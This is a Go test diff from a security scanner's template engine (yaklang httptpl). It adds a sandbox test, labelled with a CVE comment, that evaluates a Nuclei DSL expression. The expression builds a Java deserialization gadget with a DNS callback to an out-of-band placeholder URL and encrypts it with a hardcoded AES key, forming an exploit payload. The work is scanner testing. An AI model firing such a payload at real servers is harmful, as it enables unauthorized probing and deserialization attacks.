@@ -1,9 +1,10 @@
 package httptpl
 
 import (
+	"testing"
+
 	"github.com/davecgh/go-spew/spew"
 	"github.com/yaklang/yaklang/common/utils/lowhttp"
-	"testing"
 )
 
 /*
@@ -42,6 +43,17 @@ func TestNewNucleiDSLSandbox2(t *testing.T) {
 	}
 	if !results {
 		panic("contains failed")
+	}
+	spew.Dump(results)
+}
+
+// cve-2016-3347
+func TestNewNucleiDSLSandbox3(t *testing.T) {
+	raw := `base64(concat(base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="),aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{interactsh-url}}", "base64")), base64_decode("kPH+bIxk5D2deZiIxcaaaA=="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="))))`
+	box := NewNucleiDSLYakSandbox()
+	results, err := box.Execute(raw, map[string]interface{}{})
+	if err != nil {
+		panic(err)
 	}
 	spew.Dump(results)
 }
